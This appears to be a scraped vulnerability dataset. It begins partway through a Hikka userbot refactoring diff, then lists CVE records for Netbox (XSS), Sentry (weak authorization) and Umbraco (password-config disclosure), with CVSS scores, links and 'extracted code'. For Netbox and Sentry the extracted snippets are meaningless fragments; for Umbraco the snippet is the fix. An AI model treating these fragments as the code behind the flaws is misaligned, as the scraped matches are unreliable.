-    code, id_value = DIALOG.inputbox("Enter your API ID")
+    while api_id := input("\033[0;96mEnter API ID: \033[0m"):
+        if api_id.isdigit():
+            break
 
-    if not id_value or any(it not in string.digits for it in id_value):
-        DIALOG.msgbox("Invalid ID")
-        return
+        print("\033[0;91mInvalid ID\033[0m")
 
-    with open(
-        os.path.join(
-            data_root or os.path.dirname(utils.get_base_dir()), "api_token.txt"
-        ),
-        "w",
-    ) as file:
-        file.write(id_value + "\n" + hash_value)
+    if not api_id:
+        print("\033[0;91mCancelled\033[0m")
+        exit(0)
 
-    DIALOG.msgbox("API Token and ID set.")
+    (main.BASE_PATH / "api_token.txt").write_text(api_id + "\n" + api_hash)
+    print("\033[0;92mAPI config saved\033[0m")
diff --git a/hikka/database.py b/hikka/database.py
index 0806bd76..3c15611d 100755
--- a/hikka/database.py
+++ b/hikka/database.py
@@ -20,20 +20,14 @@
 
 import typing
 
-from telethon.errors.rpcerrorlist import ChannelsTooMuchError
-from telethon.tl.types import Message
+from hikkatl.errors.rpcerrorlist import ChannelsTooMuchError
+from hikkatl.tl.types import Message
 
 from . import main, utils
 from .pointers import PointerDict, PointerList
 from .tl_cache import CustomTelegramClient
 from .types import JSONSerializable
 
-DATA_DIR = (
-    os.path.normpath(os.path.join(utils.get_base_dir(), ".."))
-    if "DOCKER" not in os.environ
-    else "/data"
-)
-
 logger = logging.getLogger(__name__)
 
 
@@ -99,7 +93,7 @@ async def init(self):
         if os.environ.get("REDIS_URL") or main.get_config_key("redis_uri"):
             await self.redis_init()
 
-        self._db_path = os.path.join(DATA_DIR, f"config-{self._client.tg_id}.json")
+        self._db_file = main.BASE_PATH / f"config-{self._client.tg_id}.json"
         self.read()
 
         try:
@@ -136,8 +130,7 @@ def read(self):
             return
 
         try:
-            with open(self._db_path, "r", encoding="utf-8") as f:
-                self.update(**json.load(f))
+            self.update(**json.loads(self._db_file.read_text()))
         except (FileNotFoundError, json.decoder.JSONDecodeError):
             logger.warning("Database read failed! Creating new one...")
 
@@ -168,8 +161,10 @@ def process_db_autofix(self, db: dict) -> bool:
                 if not isinstance(subkey, (str, int)):
                     del db[key][subkey]
                     logger.warning(
-                        "DbAutoFix: Dropped subkey %s of db key %s, because it is not"
-                        " string or int",
+                        (
+                            "DbAutoFix: Dropped subkey %s of db key %s, because it is"
+                            " not string or int"
+                        ),
                         subkey,
                         key,
                     )
@@ -211,8 +206,7 @@ def save(self) -> bool:
             return True
 
         try:
-            with open(self._db_path, "w", encoding="utf-8") as f:
-                json.dump(self, f, indent=4)
+            self._db_file.write_text(json.dumps(self, indent=4))
         except Exception:
             logger.exception("Database save failed!")
             return False
diff --git a/hikka/dispatcher.py b/hikka/dispatcher.py
index 5d764e8d..4ac6226d 100755
--- a/hikka/dispatcher.py
+++ b/hikka/dispatcher.py
@@ -33,9 +33,9 @@
 import traceback
 import typing
 
-from telethon import events
-from telethon.errors import FloodWaitError, RPCError
-from telethon.tl.types import Message
+from hikkatl import events
+from hikkatl.errors import FloodWaitError, RPCError
+from hikkatl.tl.types import Message
 
 from . import main, security, utils
 from .database import Database
@@ -358,6 +358,11 @@ async def _handle_command(
         ):
             return False
 
+        if message.is_channel and message.edit_date and not message.is_group:
+            # TODO: search admin log for the author of the event
+            logger.debug("Ignoring edit in channel")
+            return False
+
         if (
             message.is_channel
             and message.is_group
diff --git a/hikka/inline/bot_pm.py b/hikka/inline/bot_pm.py
index 917f942c..90377fb1 100644
--- a/hikka/inline/bot_pm.py
+++ b/hikka/inline/bot_pm.py
@@ -18,18 +18,29 @@ def set_fsm_state(
         user: typing.Union[str, int],
         state: typing.Union[str, bool],
     ) -> bool:
+        """
+        Set FSM state for user
+        :param user: user id
+        :param state: state to set
+        :return: True if state was set, False otherwise
+        :rtype: bool
+        """
         if not isinstance(user, (str, int)):
             logger.error(
-                "Invalid type for `user` in `set_fsm_state`. Expected `str` or `int`,"
-                " got %s",
+                (
+                    "Invalid type for `user` in `set_fsm_state`. Expected `str` or"
+                    " `int`, got %s"
+                ),
                 type(user),
             )
             return False
 
         if not isinstance(state, (str, bool)):
             logger.error(
-                "Invalid type for `state` in `set_fsm_state`. Expected `str` or `bool`,"
-                " got %s",
+                (
+                    "Invalid type for `state` in `set_fsm_state`. Expected `str` or"
+                    " `bool`, got %s"
+                ),
                 type(state),
             )
             return False
@@ -44,10 +55,18 @@ def set_fsm_state(
     ss = set_fsm_state
 
     def get_fsm_state(self, user: typing.Union[str, int]) -> typing.Union[bool, str]:
+        """
+        Get FSM state for user
+        :param user: user id
+        :return: FSM state or False if user has no FSM state
+        :rtype: typing.Union[bool, str]
+        """
         if not isinstance(user, (str, int)):
             logger.error(
-                "Invalid type for `user` in `get_fsm_state`. Expected `str` or `int`,"
-                " got %s",
+                (
+                    "Invalid type for `user` in `get_fsm_state`. Expected `str` or"
+                    " `int`, got %s"
+                ),
                 type(user),
             )
             return False
diff --git a/hikka/inline/core.py b/hikka/inline/core.py
index e005cc1d..38e9927b 100644
--- a/hikka/inline/core.py
+++ b/hikka/inline/core.py
@@ -13,9 +13,9 @@
 from aiogram import Bot, Dispatcher
 from aiogram.types import ParseMode
 from aiogram.utils.exceptions import TerminatedByOtherGetUpdates, Unauthorized
-from telethon.errors.rpcerrorlist import InputUserDeactivatedError, YouBlockedUserError
-from telethon.tl.functions.contacts import UnblockRequest
-from telethon.utils import get_display_name
+from hikkatl.errors.rpcerrorlist import InputUserDeactivatedError, YouBlockedUserError
+from hikkatl.tl.functions.contacts import UnblockRequest
+from hikkatl.utils import get_display_name
 
 from ..database import Database
 from ..tl_cache import CustomTelegramClient
@@ -41,11 +41,21 @@ class InlineManager(
     List,
     BotPM,
 ):
+    """
+    Inline buttons, galleries and other Telegram-Bot-API stuff
+    :param client: Telegram client
+    :param db: Database instance
+    :param allmodules: All modules
+    :type client: hikka.tl_cache.CustomTelegramClient
+    :type db: hikka.database.Database
+    :type allmodules: hikka.loader.Modules
+    """
+
     def __init__(
         self,
         client: CustomTelegramClient,
         db: Database,
-        allmodules: "Modules",  # type: ignore
+        allmodules: "Modules",  # type: ignore  # noqa: F821
     ):
         """Initialize InlineManager to create forms"""
         self._client = client
@@ -76,6 +86,15 @@ async def register_manager(
         after_break: bool = False,
         ignore_token_checks: bool = False,
     ):
+        """
+        Register manager
+        :param after_break: Loop marker
+        :param ignore_token_checks: If `True`, will not check for token
+        :type after_break: bool
+        :type ignore_token_checks: bool
+        :return: None
+        :rtype: None
+        """
         # Get info about user to use it in this class
         self._me = self._client.tg_id
         self._name = get_display_name(self._client.hikka_me)
@@ -179,18 +198,21 @@ async def new(*args, **kwargs):
         self._cleaner_task = asyncio.ensure_future(self._cleaner())
 
     async def _stop(self):
+        """Stop the bot"""
         self._task.cancel()
         self._dp.stop_polling()
         self._cleaner_task.cancel()
 
-    def pop_web_auth_token(self, token) -> bool:
-        """Check if web confirmation button was pressed"""
+    def pop_web_auth_token(self, token: str) -> bool:
+        """
+        Check if web confirmation button was pressed
+        :param token: Token to check
+        :type token: str
+        :return: `True` if token was found, `False` otherwise
+        :rtype: bool
+        """
         if token not in self._web_auth_tokens:
             return False
 
         self._web_auth_tokens.remove(token)
         return True
-
-
-if __name__ == "__main__":
-    raise Exception("This file must be called as a module")
diff --git a/hikka/inline/events.py b/hikka/inline/events.py
index 5f8dd58d..c9bcf96b 100644
--- a/hikka/inline/events.py
+++ b/hikka/inline/events.py
@@ -92,8 +92,10 @@ async def _inline_handler(self, inline_query: AiogramInlineQuery):
                 mandatory = {"message", "photo", "gif", "video", "file"}
                 if all(item not in res for item in mandatory):
                     logger.error(
-                        "Got invalid type from inline handler. It must contain one of"
-                        " `%s`",
+                        (
+                            "Got invalid type from inline handler. It must contain one"
+                            " of `%s`"
+                        ),
                         mandatory,
                     )
                     await instance.e500()
@@ -282,8 +284,10 @@ async def _callback_query_handler(
                     except Exception:
                         logger.exception("Error on running callback watcher!")
                         await call.answer(
-                            "Error occurred while processing request. More info in"
-                            " logs",
+                            (
+                                "Error occurred while processing request. More info in"
+                                " logs"
+                            ),
                             show_alert=True,
                         )
                         return
@@ -429,11 +433,9 @@ async def _query_help(self, inline_query: InlineQuery):
                         thumb_height=128,
                         reply_markup=self.generate_markup(
                             {
-                                "text": (
-                                    self._client.loader.lookup("translations").strings(
-                                        "run_command"
-                                    )
-                                ),
+                                "text": self._client.loader.lookup(
+                                    "translations"
+                                ).strings("run_command"),
                                 "switch_inline_query_current_chat": f"{name} ",
                             }
                         ),
diff --git a/hikka/inline/form.py b/hikka/inline/form.py
index 50b7ec3a..51bb4aef 100644
--- a/hikka/inline/form.py
+++ b/hikka/inline/form.py
@@ -27,9 +27,9 @@
     InlineQueryResultVideo,
     InputTextMessageContent,
 )
-from telethon.errors.rpcerrorlist import ChatSendInlineForbiddenError
-from telethon.extensions.html import CUSTOM_EMOJIS
-from telethon.tl.types import Message
+from hikkatl.errors.rpcerrorlist import ChatSendInlineForbiddenError
+from hikkatl.extensions.html import CUSTOM_EMOJIS
+from hikkatl.tl.types import Message
 
 from .. import main, utils
 from ..types import HikkaReplyMarkup
@@ -226,8 +226,10 @@ async def form(
             or not all(isinstance(item, float) for item in location)
         ):
             logger.error(
-                "Invalid type for `location`. Expected `list` or `tuple` with 2 `float`"
-                " items, got `%s`",
+                (
+                    "Invalid type for `location`. Expected `list` or `tuple` with 2"
+                    " `float` items, got `%s`"
+                ),
                 type(location),
             )
             return False
@@ -346,9 +348,9 @@ async def answer(msg: str):
             q = await self._client.inline_query(self.bot_username, unit_id)
             m = await q[0].click(
                 utils.get_chat_id(message) if isinstance(message, Message) else message,
-                reply_to=message.reply_to_msg_id
-                if isinstance(message, Message)
-                else None,
+                reply_to=(
+                    message.reply_to_msg_id if isinstance(message, Message) else None
+                ),
             )
         except ChatSendInlineForbiddenError:
             await answer(
@@ -424,10 +426,13 @@ async def _form_inline_handler(self, inline_query: InlineQuery):
                                     .format(random.choice(VERIFICATION_EMOJIES))
                                 ),
                                 input_message_content=InputTextMessageContent(
-                                    "🔄 <b>Transferring value to userbot...</b>\n"
-                                    "<i>This message will be deleted automatically</i>"
-                                    if inline_query.from_user.id == self._me
-                                    else "🔄 <b>Transferring value to userbot...</b>",
+                                    (
+                                        "🔄 <b>Transferring value to"
+                                        " userbot...</b>\n<i>This message will be"
+                                        " deleted automatically</i>"
+                                        if inline_query.from_user.id == self._me
+                                        else "🔄 <b>Transferring value to userbot...</b>"
+                                    ),
                                     "HTML",
                                     disable_web_page_preview=True,
                                 ),
diff --git a/hikka/inline/gallery.py b/hikka/inline/gallery.py
index a88ae513..a3c8f623 100644
--- a/hikka/inline/gallery.py
+++ b/hikka/inline/gallery.py
@@ -25,9 +25,9 @@
     InputMediaPhoto,
 )
 from aiogram.utils.exceptions import BadRequest, RetryAfter
-from telethon.errors.rpcerrorlist import ChatSendInlineForbiddenError
-from telethon.extensions.html import CUSTOM_EMOJIS
-from telethon.tl.types import Message
+from hikkatl.errors.rpcerrorlist import ChatSendInlineForbiddenError
+from hikkatl.extensions.html import CUSTOM_EMOJIS
+from hikkatl.tl.types import Message
 
 from .. import main, utils
 from ..types import HikkaReplyMarkup
@@ -104,8 +104,10 @@ async def gallery(
             and all(isinstance(item, str) for item in caption)
         ) and not callable(caption):
             logger.error(
-                "Invalid type for `caption`. Expected `str` or `list` or `callable`,"
-                " got `%s`",
+                (
+                    "Invalid type for `caption`. Expected `str` or `list` or"
+                    " `callable`, got `%s`"
+                ),
                 type(caption),
             )
             return False
@@ -182,8 +184,10 @@ async def gallery(
                 next_handler = ListGalleryHelper(next_handler)
             else:
                 logger.error(
-                    "Invalid type for `next_handler`. Expected `callable` or `list` of"
-                    " `str`, got `%s`",
+                    (
+                        "Invalid type for `next_handler`. Expected `callable` or `list`"
+                        " of `str`, got `%s`"
+                    ),
                     type(next_handler),
                 )
                 return False
@@ -212,7 +216,7 @@ async def gallery(
             "message_id": None,
             "top_msg_id": utils.get_topic(message),
             "uid": unit_id,
-            "photo_url": (photo_url if isinstance(photo_url, str) else photo_url[0]),
+            "photo_url": photo_url if isinstance(photo_url, str) else photo_url[0],
             "next_handler": next_handler,
             "btn_call_data": btn_call_data,
             "photos": [photo_url] if isinstance(photo_url, str) else photo_url,
@@ -283,9 +287,9 @@ async def answer(msg: str):
             q = await self._client.inline_query(self.bot_username, unit_id)
             m = await q[0].click(
                 utils.get_chat_id(message) if isinstance(message, Message) else message,
-                reply_to=message.reply_to_msg_id
-                if isinstance(message, Message)
-                else None,
+                reply_to=(
+                    message.reply_to_msg_id if isinstance(message, Message) else None
+                ),
             )
         except ChatSendInlineForbiddenError:
             await answer(
@@ -347,8 +351,7 @@ async def _call_photo(
             typing.List[str],
         ],
     ) -> typing.Union[str, bool]:
-        """Parses photo url from `callback`. Returns url on success, otherwise `False`
-        """
+        """Parses photo url from `callback`. Returns url on success, otherwise `False`"""
         if isinstance(callback, str):
             photo_url = callback
         elif isinstance(callback, list):
@@ -359,16 +362,20 @@ async def _call_photo(
             photo_url = callback()
         else:
             logger.error(
-                "Invalid type for `next_handler`. Expected `str`, `list` or `callable`,"
-                " got %s",
+                (
+                    "Invalid type for `next_handler`. Expected `str`, `list` or"
+                    " `callable`, got %s"
+                ),
                 type(callback),
             )
             return False
 
         if not isinstance(photo_url, (str, list)):
             logger.error(
-                "Got invalid result from `next_handler`. Expected `str` or `list`,"
-                " got %s",
+                (
+                    "Got invalid result from `next_handler`. Expected `str` or `list`,"
+                    " got %s"
+                ),
                 type(photo_url),
             )
             return False
@@ -603,9 +610,7 @@ def _get_caption(self, unit_id: str, index: int = 0) -> str:
         return (
             caption
             if isinstance(caption, str)
-            else caption()
-            if callable(caption)
-            else ""
+            else caption() if callable(caption) else ""
         )
 
     def _gallery_markup(self, unit_id: str) -> InlineKeyboardMarkup:
@@ -637,9 +642,9 @@ def _gallery_markup(self, unit_id: str) -> InlineKeyboardMarkup:
                             *(
                                 [
                                     {
-                                        "text": "🛑"
-                                        if unit.get("slideshow", False)
-                                        else "⏱",
+                                        "text": (
+                                            "🛑" if unit.get("slideshow", False) else "⏱"
+                                        ),
                                         "callback": callback,
                                         "args": ("slideshow",),
                                     }
diff --git a/hikka/inline/list.py b/hikka/inline/list.py
index fa0eb7c6..d3049eab 100644
--- a/hikka/inline/list.py
+++ b/hikka/inline/list.py
@@ -21,9 +21,9 @@
     InputTextMessageContent,
 )
 from aiogram.utils.exceptions import RetryAfter
-from telethon.errors.rpcerrorlist import ChatSendInlineForbiddenError
-from telethon.extensions.html import CUSTOM_EMOJIS
-from telethon.tl.types import Message
+from hikkatl.errors.rpcerrorlist import ChatSendInlineForbiddenError
+from hikkatl.extensions.html import CUSTOM_EMOJIS
+from hikkatl.tl.types import Message
 
 from .. import main, utils
 from ..types import HikkaReplyMarkup
@@ -108,8 +108,10 @@ async def list(
 
         if not isinstance(strings, list) or not strings:
             logger.error(
-                "Invalid type for `strings`. Expected `list` with at least one element,"
-                " got `%s`",
+                (
+                    "Invalid type for `strings`. Expected `list` with at least one"
+                    " element, got `%s`"
+                ),
                 type(strings),
             )
             return False
@@ -212,9 +214,9 @@ async def answer(msg: str):
             q = await self._client.inline_query(self.bot_username, unit_id)
             m = await q[0].click(
                 utils.get_chat_id(message) if isinstance(message, Message) else message,
-                reply_to=message.reply_to_msg_id
-                if isinstance(message, Message)
-                else None,
+                reply_to=(
+                    message.reply_to_msg_id if isinstance(message, Message) else None
+                ),
             )
         except ChatSendInlineForbiddenError:
             await answer(
diff --git a/hikka/inline/token_obtainment.py b/hikka/inline/token_obtainment.py
index 15795738..1010b2b4 100644
--- a/hikka/inline/token_obtainment.py
+++ b/hikka/inline/token_obtainment.py
@@ -5,13 +5,11 @@
 # 🔑 https://www.gnu.org/licenses/agpl-3.0.html
 
 import asyncio
-import io
 import logging
-import os
 import re
 
-from telethon.errors.rpcerrorlist import YouBlockedUserError
-from telethon.tl.functions.contacts import UnblockRequest
+from hikkatl.errors.rpcerrorlist import YouBlockedUserError
+from hikkatl.tl.functions.contacts import UnblockRequest
 
 from .. import utils
 from .._internal import fw_protect
@@ -19,15 +17,6 @@
 
 logger = logging.getLogger(__name__)
 
-with open(
-    os.path.abspath(
-        os.path.join(os.path.dirname(__file__), "..", "..", "assets", "bot_pfp.png")
-    ),
-    "rb",
-) as f:
-    photo = io.BytesIO(f.read())
-    photo.name = "avatar.png"
-
 
 class TokenObtainment(InlineUnit):
     async def _create_bot(self):
@@ -85,7 +74,9 @@ async def _create_bot(self):
 
             try:
                 await fw_protect()
-                m = await conv.send_file(photo)
+                from .. import main
+
+                m = await conv.send_file(main.BASE_PATH / "assets" / "bot_pfp.png")
                 r = await conv.get_response()
 
                 logger.debug(">> <Photo>")
@@ -252,7 +243,11 @@ async def _assert_token(
 
                     try:
                         await fw_protect()
-                        m = await conv.send_file(photo)
+                        from .. import main
+
+                        m = await conv.send_file(
+                            main.BASE_PATH / "assets" / "bot_pfp.png"
+                        )
                         r = await conv.get_response()
 
                         logger.debug(">> <Photo>")
diff --git a/hikka/inline/types.py b/hikka/inline/types.py
index 8ea4d2a2..f45ad71f 100644
--- a/hikka/inline/types.py
+++ b/hikka/inline/types.py
@@ -21,7 +21,7 @@ class InlineMessage:
 
     def __init__(
         self,
-        inline_manager: "InlineManager",  # type: ignore
+        inline_manager: "InlineManager",  # type: ignore  # noqa: F821
         unit_id: str,
         inline_message_id: str,
     ):
@@ -62,7 +62,7 @@ class BotInlineMessage:
 
     def __init__(
         self,
-        inline_manager: "InlineManager",  # type: ignore
+        inline_manager: "InlineManager",  # type: ignore  # noqa: F821
         unit_id: str,
         chat_id: int,
         message_id: int,
@@ -119,7 +119,7 @@ class InlineCall(CallbackQuery, InlineMessage):
     def __init__(
         self,
         call: CallbackQuery,
-        inline_manager: "InlineManager",  # type: ignore
+        inline_manager: "InlineManager",  # type: ignore  # noqa: F821
         unit_id: str,
     ):
         CallbackQuery.__init__(self)
@@ -151,7 +151,7 @@ class BotInlineCall(CallbackQuery, BotInlineMessage):
     def __init__(
         self,
         call: CallbackQuery,
-        inline_manager: "InlineManager",  # type: ignore
+        inline_manager: "InlineManager",  # type: ignore  # noqa: F821
         unit_id: str,
     ):
         CallbackQuery.__init__(self)
@@ -229,8 +229,10 @@ async def e400(self):
         await self.answer(
             self._get_res(
                 "🚫 400",
-                "Bad request. You need to pass right arguments, follow module's"
-                " documentation",
+                (
+                    "Bad request. You need to pass right arguments, follow module's"
+                    " documentation"
+                ),
                 "https://img.icons8.com/color/344/swearing-male--v1.png",
             ),
             cache_time=0,
diff --git a/hikka/inline/utils.py b/hikka/inline/utils.py
index b2ecbb86..f7a4de7d 100644
--- a/hikka/inline/utils.py
+++ b/hikka/inline/utils.py
@@ -32,7 +32,7 @@
     MessageNotModified,
     RetryAfter,
 )
-from telethon.utils import resolve_inline_message_id
+from hikkatl.utils import resolve_inline_message_id
 
 from .. import utils
 from ..types import HikkaReplyMarkup
@@ -192,9 +192,11 @@ def _generate_markup(
                         ]
                     else:
                         logger.warning(
-                            "Button have not been added to "
-                            "form, because it is not structured "
-                            "properly. %s",
+                            (
+                                "Button have not been added to "
+                                "form, because it is not structured "
+                                "properly. %s"
+                            ),
                             button,
                         )
                 except KeyError:
@@ -529,8 +531,7 @@ async def _delete_unit_message(
         chat_id: typing.Optional[int] = None,
         message_id: typing.Optional[int] = None,
     ) -> bool:
-        """Params `self`, `unit_id` are for internal use only, do not try to pass them
-        """
+        """Params `self`, `unit_id` are for internal use only, do not try to pass them"""
         if getattr(getattr(call, "message", None), "chat", None):
             try:
                 await self.bot.delete_message(
@@ -566,8 +567,7 @@ async def _delete_unit_message(
         return True
 
     async def _unload_unit(self, unit_id: str) -> bool:
-        """Params `self`, `unit_id` are for internal use only, do not try to pass them
-        """
+        """Params `self`, `unit_id` are for internal use only, do not try to pass them"""
         try:
             if "on_unload" in self._units[unit_id] and callable(
                 self._units[unit_id]["on_unload"]
@@ -597,13 +597,15 @@ def build_pagination(
         if total_pages <= 5:
             return [
                 [
-                    {"text": number, "args": (number - 1,), "callback": callback}
-                    if number != current_page
-                    else {
-                        "text": f"· {number} ·",
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
+                    (
+                        {"text": number, "args": (number - 1,), "callback": callback}
+                        if number != current_page
+                        else {
+                            "text": f"· {number} ·",
+                            "args": (number - 1,),
+                            "callback": callback,
+                        }
+                    )
                     for number in range(1, total_pages + 1)
                 ]
             ]
@@ -611,29 +613,35 @@ def build_pagination(
         if current_page <= 3:
             return [
                 [
-                    {
-                        "text": f"· {number} ·",
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
-                    if number == current_page
-                    else {
-                        "text": f"{number} ›",
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
-                    if number == 4
-                    else {
-                        "text": f"{total_pages} »",
-                        "args": (total_pages - 1,),
-                        "callback": callback,
-                    }
-                    if number == 5
-                    else {
-                        "text": number,
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
+                    (
+                        {
+                            "text": f"· {number} ·",
+                            "args": (number - 1,),
+                            "callback": callback,
+                        }
+                        if number == current_page
+                        else (
+                            {
+                                "text": f"{number} ›",
+                                "args": (number - 1,),
+                                "callback": callback,
+                            }
+                            if number == 4
+                            else (
+                                {
+                                    "text": f"{total_pages} »",
+                                    "args": (total_pages - 1,),
+                                    "callback": callback,
+                                }
+                                if number == 5
+                                else {
+                                    "text": number,
+                                    "args": (number - 1,),
+                                    "callback": callback,
+                                }
+                            )
+                        )
+                    )
                     for number in range(1, 6)
                 ]
             ]
@@ -649,17 +657,19 @@ def build_pagination(
                     },
                 ]
                 + [
-                    {
-                        "text": f"· {number} ·",
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
-                    if number == current_page
-                    else {
-                        "text": number,
-                        "args": (number - 1,),
-                        "callback": callback,
-                    }
+                    (
+                        {
+                            "text": f"· {number} ·",
+                            "args": (number - 1,),
+                            "callback": callback,
+                        }
+                        if number == current_page
+                        else {
+                            "text": number,
+                            "args": (number - 1,),
+                            "callback": callback,
+                        }
+                    )
                     for number in range(total_pages - 2, total_pages + 1)
                 ]
             ]
diff --git a/hikka/loader.py b/hikka/loader.py
index 2a00cc4d..5c08a411 100644
--- a/hikka/loader.py
+++ b/hikka/loader.py
@@ -19,19 +19,19 @@
 import sys
 import typing
 from functools import wraps
+from pathlib import Path
 from types import FunctionType, ModuleType
 from uuid import uuid4
 
-from telethon.tl.tlobject import TLObject
+from hikkatl.tl.tlobject 
... [truncated]

================================================================================


CVE ID: CVE-2024-56917
Published: 2025-06-24T20:15:24.790
Modified: 2025-06-30T14:44:01.510
CVSS Score: 7.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Netbox Community 4.1.7 is vulnerable to Cross Site Scripting (XSS) via the maintenance banner` in maintenance mode.

References (3):
  1. https://github.com/netbox-community/netbox/releases/tag/v4.1.7 [Release Notes]
  2. https://github.com/noxlumens/Vulnerability-Research/tree/main/CVE-2024-56917 [Exploit, Third Party Advisory]
  3. https://youtu.be/GC8-PUlu2i8?si=eoScOk8IUJdwPDc_&t=172 [Exploit]

Attempting to extract code examples from references...

--- Code from https://github.com/netbox-community/netbox/releases/tag/v4.1.7 ---
name

LOGIN_REQUIRED

to_grams()

================================================================================


CVE ID: CVE-2025-53073
Published: 2025-06-24T18:15:26.813
Modified: 2025-06-26T18:58:14.280
CVSS Score: 4.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-425: CWE-425

Description:
In Sentry 25.1.0 through 25.5.1, an authenticated attacker can access a project's issue endpoint and perform unauthorized actions (such as adding a comment) without being a member of the project's team. A seven-digit issue ID must be known (it is not treated as a secret and might be mentioned publicly, or it could be predicted).

References (3):
  1. https://github.com/getsentry/self-hosted/releases
  2. https://github.com/nikolas-ch/CVEs/blob/main/Sentry_Version%3E%3D25.1.0/Sentry_%3E%3D25.1.0_WeakAuthorizationControl.txt
  3. https://github.com/nikolas-ch/CVEs/tree/main/Sentry_Version%3E%3D25.1.0

Attempting to extract code examples from references...

--- Code from https://github.com/getsentry/self-hosted/releases ---
sentry.conf.py

sentry.conf.py

SKIP_USER_PROMPT=1

================================================================================


CVE ID: CVE-2025-49147
Published: 2025-06-24T18:15:25.247
Modified: 2025-09-22T13:53:38.260
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-497: CWE-497

Description:
Umbraco, a free and open source .NET content management system, has a vulnerability in versions 10.0.0 through 10.8.10 and 13.0.0 through 13.9.1. Via a request to an anonymously authenticated endpoint it's possible to retrieve information about the configured password requirements. The information available is limited but would perhaps give some additional detail useful for someone attempting to brute force derive a user's password. This information was not exposed in Umbraco 7 or 8, nor in 14 or higher versions. The vulnerability is patched in versions 10.8.11 and 13.9.2.

References (3):
  1. https://github.com/umbraco/Umbraco-CMS/commit/b4144564c836ec6929111ce2a12eb1f67b42d61e [Patch]
  2. https://github.com/umbraco/Umbraco-CMS/commit/d8f68d2c40f8e158bd81d469f25ef3a4e1d86c4c [Patch]
  3. https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-pgvc-6h2p-q4f6 [Patch, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/umbraco/Umbraco-CMS/commit/b4144564c836ec6929111ce2a12eb1f67b42d61e ---
From b4144564c836ec6929111ce2a12eb1f67b42d61e Mon Sep 17 00:00:00 2001
From: Kenn Jacobsen <kja@umbraco.dk>
Date: Tue, 24 Jun 2025 08:39:17 +0200
Subject: [PATCH] Merge commit from fork

---
 .../Controllers/AuthenticationController.cs   | 19 +++++++++++++++----
 .../Controllers/BackOfficeController.cs       |  5 +++++
 .../Extensions/HttpContextExtensions.cs       | 11 +++++++++++
 3 files changed, 31 insertions(+), 4 deletions(-)

diff --git a/src/Umbraco.Web.BackOffice/Controllers/AuthenticationController.cs b/src/Umbraco.Web.BackOffice/Controllers/AuthenticationController.cs
index ca9cfedf3615..4b46bca7a1e1 100644
--- a/src/Umbraco.Web.BackOffice/Controllers/AuthenticationController.cs
+++ b/src/Umbraco.Web.BackOffice/Controllers/AuthenticationController.cs
@@ -131,12 +131,17 @@ public AuthenticationController(
         AuthorizationPolicies.BackOfficeAccess)] // Needed to enforce the principle set on the request, if one exists.
     public IDictionary<string, object> GetPasswordConfig(int userId)
     {
+        if (HttpContext.HasActivePasswordResetFlowSession(userId))
+        {
+            return _passwordConfiguration.GetConfiguration();
+        }
+
         Attempt<int> currentUserId =
             _backofficeSecurityAccessor.BackOfficeSecurity?.GetUserId() ?? Attempt<int>.Fail();
-        return _passwordConfiguration.GetConfiguration(
-            currentUserId.Success
-                ? currentUserId.Result != userId
-                : true);
+
+        return currentUserId.Success
+            ? _passwordConfiguration.GetConfiguration(currentUserId.Result != userId)
+            : new Dictionary<string, object>();
     }
 
     /// <summary>
@@ -417,6 +422,8 @@ public async Task<bool> IsAuthenticated()
     [Authorize(Policy = AuthorizationPolicies.DenyLocalLoginIfConfigured)]
     public async Task<ActionResult<UserDetail?>> PostLogin(LoginModel loginModel)
     {
+        HttpContext.EndPasswordResetFlowSession();
+
         // Start a timed scope to ensure failed responses return is a consistent time
         var loginDuration = Math.Max(_loginDurationAverage ?? _securitySettings.UserDefaultFailedLoginDurationInMilliseconds, _securitySettings.UserMinimumFailedLoginDurationInMilliseconds);
         await using var timedScope = new TimedScope(loginDuration, HttpContext.RequestAborted);
@@ -490,6 +497,8 @@ public async Task<IActionResult> PostRequestPasswordReset(RequestPasswordResetMo
             return BadRequest();
         }
 
+        HttpContext.EndPasswordResetFlowSession();
+
         BackOfficeIdentityUser? identityUser = await _userManager.FindByEmailAsync(model.Email);
 
         await Task.Delay(RandomNumberGenerator.GetInt32(400, 2500)); // To randomize response time preventing user enumeration
@@ -646,6 +655,8 @@ public async Task<IActionResult> PostSend2FACode([FromBody] string provider)
     [AllowAnonymous]
     public async Task<IActionResult> PostSetPassword(SetPasswordModel model)
     {
+        HttpContext.EndPasswordResetFlowSession();
+
         BackOfficeIdentityUser? identityUser =
             await _userManager.FindByIdAsync(model.UserId.ToString(CultureInfo.InvariantCulture));
             if (identityUser is null)
diff --git a/src/Umbraco.Web.BackOffice/Controllers/BackOfficeController.cs b/src/Umbraco.Web.BackOffice/Controllers/BackOfficeController.cs
index f6d7a76a488c..9a019c537a8d 100644
--- a/src/Umbraco.Web.BackOffice/Controllers/BackOfficeController.cs
+++ b/src/Umbraco.Web.BackOffice/Controllers/BackOfficeController.cs
@@ -402,6 +402,11 @@ public async Task<IActionResult> ValidatePasswordResetCode([Bind(Prefix = "u")]
 
         var result = await _userManager.VerifyUserTokenAsync(user, "Default", "ResetPassword", resetCode);
 
+        if (result)
+        {
+            HttpContext.StartPasswordResetFlowSession(userId);
+        }
+
         return result ?
 
             // Redirect to login with userId and resetCode
diff --git a/src/Umbraco.Web.BackOffice/Extensions/HttpContextExtensions.cs b/src/Umbraco.Web.BackOffice/Extensions/HttpContextExtensions.cs
index 38a681917abe..33644df543d7 100644
--- a/src/Umbraco.Web.BackOffice/Extensions/HttpContextExtensions.cs
+++ b/src/Umbraco.Web.BackOffice/Extensions/HttpContextExtensions.cs
@@ -5,9 +5,20 @@ namespace Umbraco.Extensions;
 
 public static class HttpContextExtensions
 {
+    private const string PasswordResetFlowSessionKey = nameof(PasswordResetFlowSessionKey);
+
